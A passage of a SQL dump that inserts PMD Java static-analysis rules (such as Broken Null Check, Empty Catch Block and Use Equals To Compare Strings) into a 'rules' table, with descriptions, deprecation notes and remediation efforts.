This rule is deprecated, use {rule:squid:S00115} and {rule:squid:S00116} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'naming', false, 'HTML', 1510817811578, 1510817811581, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (102, 'Broken Null Check', 'BrokenNullCheck', 'rulesets/java/basic.xml/BrokenNullCheck', 'pmd', 'The null check is broken since it will throw a Nullpointer itself. The reason is that a method is called on the object when it is null. It is likely that you used || instead of && or vice versa.

<p>
This rule is deprecated, use {rule:squid:S1697} instead.
</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811587, 1510817811588, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (103, 'Assignment To Non Final Static', 'AssignmentToNonFinalStatic', 'rulesets/java/design.xml/AssignmentToNonFinalStatic', 'pmd', 'Identifies a possible unsafe usage of a static field.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811589, 1510817811590, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (104, 'Replace Vector With List', 'ReplaceVectorWithList', 'rulesets/java/migrating.xml/ReplaceVectorWithList', 'pmd', 'Consider replacing Vector usages with the newer java.util.ArrayList if expensive threadsafe operation is not required.

<p>
This rule is deprecated, use {rule:squid:S1149} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811591, 1510817811594, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (105, 'Coupling - excessive imports', 'ExcessiveImports', 'rulesets/java/coupling.xml/ExcessiveImports', 'pmd', 'A high number of imports can indicate a high degree of coupling within an object. Rule counts the number of unique imports and reports a violation if the count is above the user defined threshold.

<p>
This rule is deprecated, use {rule:squid:S1200} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2h', NULL, NULL, NULL, false, 'HTML', 1510817811596, 1510817811597, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (106, 'Flags unnecessary qualified usages of this', 'UselessQualifiedThis', 'rulesets/java/unnecessary.xml/UselessQualifiedThis', 'pmd', '<p>Look for qualified this usages in the same class.</p>

<p>Examples:</p>

<pre>
public class Foo {
  final Foo otherFoo = Foo.this;  // use "this" directly

  public void doSomething() {
    final Foo anotherFoo = Foo.this;  // use "this" directly
  }

  private ActionListener returnListener() {
    return new ActionListener() {
      @Override
      public void actionPerformed(ActionEvent e) {
        doSomethingWithQualifiedThis(Foo.this);  // This is fine
      }
    };
  }

  private class Foo3 {
    final Foo myFoo = Foo.this;  // This is fine
  }

  private class Foo2 {
    final Foo2 myFoo2 = Foo2.this;  // Use "this" direclty
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811599, 1510817811599, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (107, 'Android - call super last', 'CallSuperLast', 'rulesets/java/android.xml/CallSuperLast', 'pmd', 'Super should be called at the end of the method. Example :
<pre>
public class DummyActivity extends Activity {
  public void onPause() {
    foo();
    // missing call to super.onPause()
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811601, 1510817811601, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (108, 'Avoid Instanceof Checks In Catch Clause', 'AvoidInstanceofChecksInCatchClause', 'rulesets/java/design.xml/AvoidInstanceofChecksInCatchClause', 'pmd', 'Each caught exception type should be handled in its own catch clause.

<p>
This rule is deprecated, use {rule:squid:S1193} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811602, 1510817811603, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (109, 'Comment the default access modifier', 'CommentDefaultAccessModifier', 'rulesets/java/comments.xml/CommentDefaultAccessModifier', 'pmd', '<p>
  To avoid mistakes if we want that a Method, Field or Nested class have a default access modifier
  we must add a comment at the beginning of the Method, Field or Nested class.
  By default the comment must be /* default */, if you want another, you have to provide a regex.
</p>

<pre>
public class Foo {
    final String stringValue = "some string";
    String getString() {
       return stringValue;
    }

    class NestedFoo {
    }
}

// should be
public class Foo {
  /* default */ final String stringValue = "some string";
  /* default */ String getString() {
     return stringValue;
  }

  /* default */ class NestedFoo {
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811605, 1510817811605, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (110, 'Premature Declaration', 'PrematureDeclaration', 'rulesets/java/optimizations.xml/PrematureDeclaration', 'pmd', 'Checks for variables that are defined before they might be used. A reference is deemed to be premature if it is created right before a block of code that doesn''t use it that also has the ability to return or throw an exception. Example: 
<pre>
public int getLength(String[] strings) {

  int length = 0; // declared prematurely

  if (strings == null || strings.length == 0) return 0;

  for (String str : strings) {
    length += str.length();
  }

  return length;
}
</pre>

<p>
  This rule is deprecated, use {rule:squid:S1941} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811608, 1510817811608, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (111, 'Dataflow Anomaly Analysis', 'DataflowAnomalyAnalysis', 'rulesets/java/controversial.xml/DataflowAnomalyAnalysis', 'pmd', 'The dataflow analysis tracks local definitions, undefinitions and references to variables on different paths on the data flow. From those informations there can be found various problems. 1. UR - Anomaly: There is a reference to a variable that was not defined before. This is a bug and leads to an error. 2. DU - Anomaly: A recently defined variable is undefined. These anomalies may appear in normal source text. 3. DD - Anomaly: A recently defined variable is redefined. This is ominous but don''t have to be a bug.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811609, 1510817811610, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (112, 'Abstract class without any methods', 'AbstractClassWithoutAnyMethod', 'rulesets/java/design.xml/AbstractClassWithoutAnyMethod', 'pmd', 'If the abstract class does not provides any methods, it may be just a data container that is not to be instantiated. In this case, it''s probably better to use a private or a protected constructor in order to prevent instantiation than make the class misleadingly abstract. Example :
<pre>
public class abstract Example {
  String field;
  int otherField;
}
</pre>

<p>
 This rule is deprecated, use {rule:squid:S1694} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811613, 1510817811613, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (113, 'Optimizable To Array Call', 'OptimizableToArrayCall', 'rulesets/java/design.xml/OptimizableToArrayCall', 'pmd', 'A call to Collection.toArray can use the Collection''s size vs an empty Array of the desired type.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811614, 1510817811615, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (114, 'Unused Null Check In Equals', 'UnusedNullCheckInEquals', 'rulesets/java/unnecessary.xml/UnusedNullCheckInEquals', 'pmd', 'After checking an object reference for null, you should invoke equals() on that object rather than passing it to another object''s equals() method.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811616, 1510817811617, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (115, 'Method Argument Could Be Final', 'MethodArgumentCouldBeFinal', 'rulesets/java/optimizations.xml/MethodArgumentCouldBeFinal', 'pmd', 'A method argument that is never assigned can be declared final.

<p>
This rule is deprecated, use {rule:squid:S1226} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811618, 1510817811618, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (116, 'Uncommented Empty Method', 'UncommentedEmptyMethodBody', 'rulesets/java/design.xml/UncommentedEmptyMethodBody', 'pmd', '<p>Uncommented Empty Method finds instances where a method does not contain statements, but there is no comment. By explicitly commenting empty methods it is easier to distinguish between intentional (commented) and unintentional empty methods.</p>

<p>
This rule is deprecated, use {rule:squid:S1186} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'comment', false, 'HTML', 1510817811619, 1510817811620, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (117, 'Use ConcurrentHashMap', 'UseConcurrentHashMap', 'rulesets/java/controversial.xml/UseConcurrentHashMap', 'pmd', 'Since Java5 brought a new implementation of the Map interface, specially designed for concurrent application.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'multithreading', false, 'HTML', 1510817811621, 1510817811622, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (118, 'Class Cast Exception With To Array', 'ClassCastExceptionWithToArray', 'rulesets/java/basic.xml/ClassCastExceptionWithToArray', 'pmd', 'if you need to get an array of a class from your Collection, you should pass an array of the desidered class as the parameter of the toArray method. Otherwise you will get a ClassCastException.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811624, 1510817811625, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (119, 'Only One Return', 'OnlyOneReturn', 'rulesets/java/controversial.xml/OnlyOneReturn', 'pmd', 'A method should have only one exit point, and that should be the last statement in the method.

<p>
This rule is deprecated, use {rule:squid:S1142} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, NULL, false, 'HTML', 1510817811628, 1510817811628, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (120, 'Unnecessary Case Change', 'UnnecessaryCaseChange', 'rulesets/java/strings.xml/UnnecessaryCaseChange', 'pmd', 'Using equalsIgnoreCase() is faster than using toUpperCase/toLowerCase().equals()

<p>
This rule is deprecated, use {rule:squid:S1157} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811629, 1510817811630, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (121, 'Empty Method In Abstract Class Should Be Abstract', 'EmptyMethodInAbstractClassShouldBeAbstract', 'rulesets/java/design.xml/EmptyMethodInAbstractClassShouldBeAbstract', 'pmd', 'An empty method in an abstract class should be abstract instead, as developer may rely on this empty implementation rather than code the appropriate one.
  <pre>
public abstract class ShouldBeAbstract
{
  public Object couldBeAbstract()
  {
  // Should be abstract method ?
    return null;
  }

  public void couldBeAbstract()
  {
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811631, 1510817811632, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (122, 'Immutable Field', 'ImmutableField', 'rulesets/java/design.xml/ImmutableField', 'pmd', 'Identifies private fields whose values never change once they are initialized either in the declaration of the field or by a constructor. This aids in converting existing classes to immutable classes.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811633, 1510817811633, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (123, 'Simplify Starts With', 'SimplifyStartsWith', 'rulesets/java/optimizations.xml/SimplifyStartsWith', 'pmd', 'Since it passes in a literal of length 1, this call to String.startsWith can be rewritten using String.charAt(0) to save some time.', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811634, 1510817811635, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (124, 'Std Cyclomatic Complexity', 'StdCyclomaticComplexity', 'rulesets/java/codesize.xml/StdCyclomaticComplexity', 'pmd', 'Complexity directly affects maintenance costs is determined by the number of decision points in a method plus one for the method entry. The decision points include ''if'', ''while'', ''for'', and ''case labels'' calls. Generally, numbers ranging from 1-4 denote low complexity, 5-7 denote moderate complexity, 8-10 denote high complexity, and 11+ is very high complexity.

<p>
  This rule is deprecated, use {rule:squid:MethodCyclomaticComplexity} or {rule:squid:ClassCyclomaticComplexity} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'size', false, 'HTML', 1510817811636, 1510817811637, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (125, 'Empty Catch Block', 'EmptyCatchBlock', 'rulesets/java/empty.xml/EmptyCatchBlock', 'pmd', '<p>
Empty Catch Block finds instances where an exception is caught, but nothing is done. In most circumstances, this swallows an exception which should either be acted on or reported.
</p>

<p>
This rule is deprecated, use {rule:squid:S00108} instead.
</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'error-handling', false, 'HTML', 1510817811641, 1510817811641, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (126, 'Use Utility Class', 'UseUtilityClass', 'rulesets/java/design.xml/UseUtilityClass', 'pmd', 'For classes that only have static methods, consider making them utility classes. 
Note that this doesn''t apply to abstract classes, since their subclasses may well include non-static methods. 
Also, if you want this class to be a utility class, remember to add a private constructor to prevent instantiation. 
(Note, that this use was known before PMD 5.1.0 as UseSingleton).

<p>
This rule is deprecated, use {rule:squid:S1118} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '30min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817811643, 1510817811644, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (127, 'Use Equals To Compare Strings', 'UseEqualsToCompareStrings', 'rulesets/java/strings.xml/UseEqualsToCompareStrings', 'pmd', 'Using "==" or "!=" to compare strings only works if intern version is used on both sides.

<p>
This rule is deprecated, use {rule:squid:StringEqualityComparisonCheck} or {rule:squid:S1698} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811645, 1510817811645, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (128, 'Do Not Extend Java Lang Error', 'DoNotExtendJavaLangError', 'rulesets/java/strictexception.xml/DoNotExtendJavaLangError', 'pmd', 'Errors are system exceptions. Do not extend them.

<p>
This rule is deprecated, use {rule:squid:S1194} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811647, 1510817811648, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (129, 'Inefficient Empty String Check', 'InefficientEmptyStringCheck', 'rulesets/java/strings.xml/InefficientEmptyStringCheck', 'pmd', 'String.trim().length() is an inefficient way to check if a String is really empty, as it creates a new String object just to check its size. Consider creating a static function that loops through a string, checking Character.isWhitespace() on each character and returning false if a non-whitespace character is found.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, NULL, false, 'HTML', 1510817811649, 1510817811650, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (130, 'Avoid Thread Group', 'AvoidThreadGroup', 'rulesets/java/basic.xml/AvoidThreadGroup', 'pmd', 'Avoid using ThreadGroup; although it is intended to be used in a threaded environment it contains methods that are not thread safe.', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'multithreading', false, 'HTML', 1510817811651, 1510817811652, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (131, 'Append Character With Char', 'AppendCharacterWithChar', 'rulesets/java/strings.xml/AppendCharacterWithChar', 'pmd', 'Avoid concatenating characters as strings in StringBuffer.append.', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811653, 1510817811653, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (173, 'Missing Break In Switch', 'MissingBreakInSwitch', 'rulesets/java/design.xml/MissingBreakInSwitch', 'pmd', 'A switch statement without an enclosed break statement may be a bug.

<p>
This rule is deprecated, use {rule:squid:S128} instead.
</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811755, 1510817811756, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (132, 'Java5 migration - Long instantiation', 'LongInstantiation', 'rulesets/java/migrating.xml/LongInstantiation', 'pmd', 'In JDK 1.5, calling new Long() causes memory allocation. Long.valueOf() is more memory friendly. Example :
  <pre>
public class Foo {
private Long i = new Long(0); // change to Long i =
Long.valueOf(0);
}
  </pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811654, 1510817811658, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (133, 'Ncss Type Count', 'NcssTypeCount', 'rulesets/java/codesize.xml/NcssTypeCount', 'pmd', 'This rule uses the NCSS (Non Commenting Source Statements) algorithm to determine the number of lines of code for a given type. NCSS ignores comments, and counts actual statements. Using this algorithm, lines of code that are split are counted as one.

<p>
  This rule is deprecated, use {rule:common-java:InsufficientCommentDensity} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'size', false, 'HTML', 1510817811661, 1510817811661, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (134, 'Avoid Catching NPE', 'AvoidCatchingNPE', 'rulesets/java/strictexception.xml/AvoidCatchingNPE', 'pmd', 'Code should never throw NPE under normal circumstances. A catch block may hide the original error, causing other more subtle errors in its wake.

<p>
This rule is deprecated, use {rule:squid:S1696} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'error-handling', false, 'HTML', 1510817811663, 1510817811664, 1);
